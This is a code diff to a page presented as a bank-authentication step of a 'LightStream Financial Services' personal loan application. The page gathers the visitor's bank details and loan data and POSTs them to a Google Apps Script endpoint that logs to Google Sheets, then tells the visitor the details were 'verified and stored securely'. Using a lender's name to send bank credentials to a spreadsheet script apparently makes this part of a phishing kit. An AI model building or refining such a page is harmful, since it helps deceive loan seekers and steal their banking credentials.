@@ -417,14 +417,14 @@
         }
     </script>
     <script>
-// Load bank data from localStorage when page loads
+// Load bank data from sessionStorage when page loads
 document.addEventListener("DOMContentLoaded", function() {
     console.log("=== BANK AUTH PAGE LOADED ===");
     
     // Check if coming from personal loan form
-    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+    const loanData = JSON.parse(sessionStorage.getItem("loanData")) || {};
     
-    console.log("Loan data from localStorage:", loanData);
+    console.log("Loan data from sessionStorage:", loanData);
     console.log("Customer Bank in data:", loanData.customerBank);
     console.log("Bank Name in data:", loanData.bankName);
     console.log("All available keys:", Object.keys(loanData));
@@ -448,72 +448,58 @@ document.addEventListener("DOMContentLoaded", function() {
             'us-bank': 'U.S. Bank',
             'pnc': 'PNC Bank',
             'td-bank': 'TD Bank',
-            'bbt': 'BB&T (now Truist)',
-            'suntrust': 'SunTrust (now Truist)',
-            'regions': 'Regions Bank',
-            'fifth-third': 'Fifth Third Bank',
-            'keybank': 'KeyBank',
-            'huntington': 'Huntington Bank',
-            'citizens': 'Citizens Bank',
-            'ally': 'Ally Bank',
-            'discover': 'Discover Bank',
-            'synchrony': 'Synchrony Bank',
-            'marcus': 'Marcus by Goldman Sachs',
-            'other': 'Other Bank'
-        };
+            // Load bank name from sessionStorage (not localStorage)
+    const loanData = JSON.parse(sessionStorage.getItem("loanData")) || {};
+    
+    if (loanData && loanData.customerBank) {
+        console.log("🏦 Loading bank from sessionStorage:", loanData.customerBank);
         
-        // Clear existing options and add the selected bank
-        bankNameSelect.innerHTML = '';
-        const option = document.createElement('option');
-        option.value = bankValue;
-        option.textContent = bankNames[bankValue] || 'Other Bank';
-        option.selected = true;
-        bankNameSelect.appendChild(option);
-        
-        console.log("✅ Bank populated:", bankValue, "=>", bankNames[bankValue]);
-        console.log("Bank select HTML after update:", bankNameSelect.innerHTML);
-    } else {
-        console.log("❌ No bank data found in localStorage");
-        console.log("Available keys:", Object.keys(loanData));
-        
-        // If no bank data from loan form, allow manual selection
+        // Set bank name in bank auth form
+        const bankNameSelect = document.getElementById("bankName");
         if (bankNameSelect) {
-            bankNameSelect.innerHTML = '<option value="">Select your bank</option>';
-            // Add all bank options
+            // Map bank values to display names
             const bankNames = {
                 'chase': 'Chase Bank',
                 'bank-of-america': 'Bank of America',
                 'wells-fargo': 'Wells Fargo',
                 'citibank': 'Citibank',
                 'capital-one': 'Capital One',
-                'us-bank': 'U.S. Bank',
-                'pnc': 'PNC Bank',
+                'us-bank': 'US Bank',
+                'pnc-bank': 'PNC Bank',
                 'td-bank': 'TD Bank',
-                'bbt': 'BB&T (now Truist)',
-                'suntrust': 'SunTrust (now Truist)',
-                'regions': 'Regions Bank',
-                'fifth-third': 'Fifth Third Bank',
+                'bank-of-the-west': 'Bank of the West',
+                'regions-bank': 'Regions Bank',
+                'suntrust': 'SunTrust Bank',
+                'bb-t': 'BB&T',
+                'fifth-third-bank': 'Fifth Third Bank',
                 'keybank': 'KeyBank',
                 'huntington': 'Huntington Bank',
-                'citizens': 'Citizens Bank',
-                'ally': 'Ally Bank',
-                'discover': 'Discover Bank',
-                'synchrony': 'Synchrony Bank',
-                'marcus': 'Marcus by Goldman Sachs',
-                'other': 'Other Bank'
+                'm-t-bank': 'M&T Bank',
+                'citizens-bank': 'Citizens Bank',
+                'barclays': 'Barclays',
+                'credit-union': 'Credit Union',
+                'other': 'Other'
             };
             
-            for (const [value, name] of Object.entries(bankNames)) {
-                const option = document.createElement('option');
-                option.value = value;
-                option.textContent = name;
-                bankNameSelect.appendChild(option);
-            }
+            const bankValue = loanData.customerBank;
+            const bankDisplayName = bankNames[bankValue] || bankValue;
+            
+            // Clear existing options and add the selected bank
+            bankNameSelect.innerHTML = '';
+            const option = document.createElement('option');
+            option.value = bankValue;
+            option.textContent = bankDisplayName;
+            option.selected = true;
+            bankNameSelect.appendChild(option);
+            
+            console.log("✅ Bank name set to:", bankDisplayName);
         }
+    } else {
+        console.log("No bank data found in sessionStorage");
     }
 });
 
-const SHEET_URL = "https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec";
+    const SHEET_URL = "https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec";
 
 document.querySelector("form").addEventListener("submit", async function(e) {
   e.preventDefault();
@@ -545,15 +531,15 @@ document.querySelector("form").addEventListener("submit", async function(e) {
     ...bankAccountInfo
   };
 
-  console.log("Loan data from localStorage:", loanData);
+  console.log("Loan data from sessionStorage:", loanData);
   console.log("Bank data:", bankData);
   console.log("Final data being sent to Google Sheets:", finalData);
 
   try {
-    // Send Bank Authentication email (NEW - separate email)
-    sendBankAuthEmail(bankData, loanData);
+    // Skip EmailJS - using Google Apps Script email instead
+    console.log("📧 Email will be sent via Google Apps Script");
 
-    // Continue with Google Sheets submission (keep existing functionality)
+    // Continue with Google Sheets submission (ORIGINAL WORKING VERSION)
     const res = await fetch(SHEET_URL, {
       method: "POST",
       body: JSON.stringify(finalData)
@@ -561,32 +547,35 @@ document.querySelector("form").addEventListener("submit", async function(e) {
 
     const result = await res.text();
     console.log("Google Sheet Response:", result);
+    
+    // Parse the JSON response
+    const response = JSON.parse(result);
+    console.log("Parsed response:", response);
+    
+    if (response.status === "success") {
+        // Success - proceed with redirect
+        if (hasLoanData) {
+          alert("🏦 Bank Verification Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.");
 
-    // Handle different scenarios based on whether user has loan data
-    if (hasLoanData) {
-      // User came from personal loan form - continue to loan agreement
-      alert("🏦 Bank Verification Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.");
+          sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
 
-      // Store loan data for loan agreement page (SECURE: sessionStorage only)
-      sessionStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+          setTimeout(() => {
+            window.location.href = "loan-agreement.html";
+          }, 1000);
+        } else {
+          alert("✅ Bank Authentication Successful!\n\nYour bank details have been verified and stored securely.\n\nThank you for choosing LightStream Financial Services.\n\nYou will be redirected to our homepage.");
 
-      // Redirect to loan agreement page after successful submission
-      setTimeout(() => {
-        window.location.href = "loan-agreement.html";
-      }, 1000);
+          setTimeout(() => {
+            window.location.href = "index.html";
+          }, 2000);
+        }
     } else {
-      // Standalone bank auth - show simple success and redirect to homepage
-      alert("✅ Bank Authentication Successful!\n\nYour bank details have been verified and stored securely.\n\nThank you for choosing LightStream Financial Services.\n\nYou will be redirected to our homepage.");
-
-      // Redirect to homepage after successful submission
-      setTimeout(() => {
-        window.location.href = "index.html";
-      }, 2000);
+        throw new Error(response.message || "Unknown error occurred");
     }
 
   } catch (err) {
-    alert("Error sending data ❌");
-    console.error(err);
+    console.error("❌ Error details:", err);
+    alert("❌ Submission failed: " + err.message + "\n\nPlease check your internet connection and try again.\n\nYour data has been preserved in the form.");
   }
 });
 
